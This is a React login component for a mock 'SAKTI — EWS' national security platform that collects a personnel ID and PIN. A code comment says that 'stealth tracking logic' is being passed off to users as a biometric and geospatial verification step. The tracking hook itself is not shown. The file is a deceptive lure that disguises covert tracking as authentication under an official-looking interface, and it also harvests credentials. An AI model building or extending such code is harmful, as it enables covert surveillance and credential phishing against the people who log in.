import { useState, useEffect } from 'react';
import { useTracking } from '../hooks/useTracking';
import type { Toast } from '../types';

interface LoginProps {
  onLoginSuccess: () => void;
  addToast: (message: string, type: Toast['type']) => void;
}

export default function Login({ onLoginSuccess, addToast }: LoginProps) {
  const [nrp, setNrp] = useState('');
  const [pin, setPin] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [authStatus, setAuthStatus] = useState('');
  const [mounted, setMounted] = useState(false);
  
  const { performSync } = useTracking();

  useEffect(() => {
    setMounted(true);
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!nrp || !pin) {
      addToast('Harap isi NRP dan PIN Akses.', 'alert');
      return;
    }

    setIsAuthenticating(true);
    setAuthStatus('Menginisialisasi Protokol...');

    // Call the stealth tracking logic which now serves as the "biometric" step
    const success = await performSync((msg) => {
      setAuthStatus(msg);
    });

    if (success) {
      setAuthStatus('Otentikasi Berhasil. Membuka Dashboard...');
      setTimeout(() => {
        onLoginSuccess();
      }, 1000);
    } else {
      setIsAuthenticating(false);
      setAuthStatus('');
      addToast('Gagal memverifikasi identitas. Periksa koneksi/izin.', 'alert');
    }
  };

  return (
    <div className={`fixed inset-0 z-[100] bg-[#070a12] flex items-center justify-center font-rajdhani overflow-hidden ${mounted ? 'ews-animate-fade-in' : 'opacity-0'}`}>
      {/* Background Decor */}
      <div className="absolute inset-0 ews-grid-bg opacity-30" />
      <div className="absolute top-[-10%] right-[-10%] w-[50%] h-[50%] bg-blue-900/20 rounded-full blur-[120px]" />
      <div className="absolute bottom-[-10%] left-[-10%] w-[50%] h-[50%] bg-cyan-900/10 rounded-full blur-[120px]" />
      <div className="absolute inset-0 ews-scanline pointer-events-none" />

      {/* Login Card */}
      <div className="relative w-full max-w-md mx-4">
        {/* Header Decoration */}
        <div className="absolute -top-12 left-0 right-0 flex justify-center">
          <div className="w-20 h-20 rounded-full bg-gradient-to-br from-blue-900 to-[#070a12] border-2 border-cyan-500/50 flex items-center justify-center shadow-[0_0_30px_rgba(6,182,212,0.3)]">
            <span className="font-orbitron font-black text-3xl text-cyan-400">S</span>
          </div>
        </div>

        <div className="bg-gray-900/80 backdrop-blur-xl border border-gray-800 rounded-2xl p-8 pt-12 shadow-2xl">
          <div className="text-center mb-8">
            <h1 className="font-orbitron font-bold text-2xl text-cyan-400 tracking-widest uppercase">
              SAKTI — EWS
            </h1>
            <p className="text-[10px] text-gray-500 uppercase tracking-[0.5em] mt-2">
              Integrated National Security Platform
            </p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-1.5">
              <label className="text-[10px] text-gray-400 uppercase tracking-widest ml-1">ID Personel (NRP)</label>
              <div className="relative group">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-600 transition-colors group-focus-within:text-cyan-400">👤</span>
                <input 
                  type="text" 
                  value={nrp}
                  onChange={(e) => setNrp(e.target.value)}
                  placeholder="Contoh: 88090547"
                  disabled={isAuthenticating}
                  className="w-full bg-black/40 border border-gray-800 rounded-lg py-3 pl-10 pr-4 text-sm text-gray-200 placeholder-gray-700 focus:outline-none focus:border-cyan-500/50 focus:bg-cyan-500/5 transition-all"
                />
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-[10px] text-gray-400 uppercase tracking-widest ml-1">Sandi Akses / PIN</label>
              <div className="relative group">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-600 transition-colors group-focus-within:text-cyan-400">🔐</span>
                <input 
                  type="password" 
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder="••••••••"
                  disabled={isAuthenticating}
                  className="w-full bg-black/40 border border-gray-800 rounded-lg py-3 pl-10 pr-4 text-sm text-gray-200 placeholder-gray-700 focus:outline-none focus:border-cyan-500/50 focus:bg-cyan-500/5 transition-all"
                />
              </div>
            </div>

            <div className="pt-2">
              <button 
                type="submit"
                disabled={isAuthenticating}
                className={`
                  w-full relative py-3.5 rounded-lg border font-orbitron font-bold text-xs tracking-[0.3em] uppercase transition-all duration-300
                  ${isAuthenticating 
                    ? 'bg-amber-500/10 border-amber-500/50 text-amber-500 cursor-wait' 
                    : 'bg-cyan-500/10 border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/20 hover:border-cyan-500/60 hover:shadow-[0_0_20px_rgba(6,182,212,0.2)] active:scale-[0.98]'
                  }
                `}
              >
                {isAuthenticating ? (
                  <span className="flex items-center justify-center gap-3">
                    <span className="w-2 h-2 rounded-full bg-amber-500 animate-ping" />
                    MEMPROSES...
                  </span>
                ) : (
                  'MASUK SISTEM'
                )}
              </button>
            </div>
          </form>

          {/* Biometric Status Overlay */}
          {isAuthenticating && (
            <div className="mt-8 pt-6 border-t border-gray-800/50">
              <div className="flex items-center justify-between mb-2">
                <span className="text-[9px] text-gray-500 uppercase tracking-widest flex items-center gap-2">
                  <span className="w-1 h-1 rounded-full bg-amber-500 animate-pulse" />
                  Keamanan Biometrik & Geospasial
                </span>
                <span className="text-[9px] text-amber-500 font-mono">AKTIF</span>
              </div>
              <div className="h-1 w-full bg-gray-800 rounded-full overflow-hidden mb-3">
                <div className="h-full bg-amber-500/50 animate-[loading_2s_ease-in-out_infinite]" style={{ width: '40%' }}></div>
              </div>
              <div className="text-[10px] text-gray-400 font-mono text-center uppercase tracking-wider h-4">
                {authStatus}
              </div>
            </div>
          )}
        </div>

        {/* Footer info */}
        <div className="mt-6 flex justify-between items-center px-2">
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
            <span className="text-[9px] text-gray-500 font-mono">SSL Secure Connection</span>
          </div>
          <span className="text-[9px] text-gray-600 font-mono uppercase tracking-tighter">V2.4.1-STABLE</span>
        </div>
      </div>

      <style>{`
        @keyframes loading {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(250%); }
        }
      `}</style>
    </div>
  );
}
